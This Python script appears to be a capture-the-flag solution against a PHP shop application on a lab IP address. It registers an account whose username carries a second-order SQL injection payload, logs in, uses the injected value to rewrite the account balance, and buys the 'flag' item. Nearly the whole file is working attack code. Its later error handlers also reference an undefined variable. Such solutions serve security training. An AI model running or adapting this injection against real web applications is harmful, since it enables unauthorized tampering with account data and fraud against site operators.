import requests

base_url = "http://10.0.2.182:20108"
session = requests.Session()
session.verify = False
# session.proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}

def send_post_request(endpoint, data, cookies=None):
    url = f"{base_url}{endpoint}"
    response = session.post(url, data=data, cookies=cookies)
    if response.status_code != 200:
        exit(f"Error: Received status code {response.status_code} for endpoint {endpoint}")
    session.cookies.clear()
    return response

if __name__ == "__main__":
    user = 'cc'
    password = 'Abcd@1234'
    payload = f"{user}' into @_-- -"
    cookies = {
        "PHPSESSID": "6e43211e0076d0e1b63f5d00a11403f1"
    }

    response = send_post_request("/register.php", {
        "username": user, 
        "password": password, 
        "fullname": "1347"
    })
    print(f'Registered user {user} with password {password}')

    response = send_post_request("/register.php", {
        "username": payload, 
        "password": password, 
        "fullname": "fooo"
    }, cookies=cookies)
    print(f'Registered user {payload} with password {password}')

    login = send_post_request("/login.php", {
        "username": payload, 
        "password": password
    }, cookies=cookies)
    print(f'Logged in as {payload} with cookie: {login.cookies}')

    # Cheat to get the flag
    response = session.get(f"{base_url}/profile.php?new_balance=@_", cookies=cookies)
    if response.status_code != 200:
        exit(f"Error: Received status code {response.status_code} for endpoint {endpoint}")

    # Buy naruto to decrease -10pts
    response = session.get(f"{base_url}/index.php?buy=naruto", cookies=cookies)
    if response.status_code != 200:
        exit(f"Error: Received status code {response.status_code} for endpoint {endpoint}")

    # Buy flag
    response = session.get(f"{base_url}/index.php?buy=flag", cookies=cookies)
    if response.status_code != 200:
        exit(f"Error: Received status code {response.status_code} for endpoint {endpoint}")    
    print(response.text)